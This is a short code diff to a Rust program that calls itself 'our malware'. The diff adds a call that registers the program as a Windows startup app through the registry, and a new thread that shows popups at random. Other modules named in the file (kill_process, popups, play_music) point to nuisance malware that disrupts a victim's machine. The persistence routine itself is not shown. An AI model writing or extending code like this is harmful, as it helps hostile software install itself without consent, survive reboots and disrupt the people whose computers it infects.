@@ -10,8 +10,12 @@ mod play_music;
 mod utils;
 mod popups;
 mod kill_process;
+mod persistence;
 
 fn main() {
+    /* Adds our malware to the list of windows startup apps */
+    persistence::add_startup_windows_registry();
+
     let iterations: usize = 240;
 
     let mut images: HashMap<&str, &str> = HashMap::new();
@@ -60,6 +64,10 @@ fn main() {
 
     thread::spawn(move || {
         popups::popup_images_randomly(image_paths, iterations, 3000, 10000);
+    });
+
+    thread::spawn(move || {
+        popups::popup_dominos_randomly(iterations, 3000, 10000);
     });
 
     /* Play annoying music with increasing speed and crescendo */
